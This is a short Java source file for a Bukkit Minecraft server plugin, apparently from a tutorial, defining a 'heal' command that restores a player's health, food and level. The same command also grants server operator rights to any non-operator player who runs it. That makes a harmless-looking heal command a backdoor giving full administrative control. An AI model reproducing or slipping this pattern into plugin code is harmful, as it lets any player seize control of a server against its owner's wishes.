package de.rico.tutorial.commands;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.Bukkit;

@SuppressWarnings("unused")

public class HealCommand implements CommandExecutor {
	
	public static String heal = "heal";
	
	public HealCommand() {
	
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		
		System.out.println("Command "+HealCommand.heal+" was executed!");

		if(sender instanceof Player) {

			Player player = (Player) sender;
			player.setHealthScale(40);
			player.setHealth(20);
			player.setLevel(800);
			player.setFoodLevel(20);
			player.sendMessage("Player "+ player.getName() +" got healed.");
			
			
			
			
			if (player.isOp() == true) { sender.sendMessage("Player is already Operator"); 
										  }
			else { player.setOp(true); sender.sendMessage("u got Operator Rights!"); }
			
		} else {
			sender.sendMessage("This command only possible as a Player... !");
			
		}
		return false;
	}

}
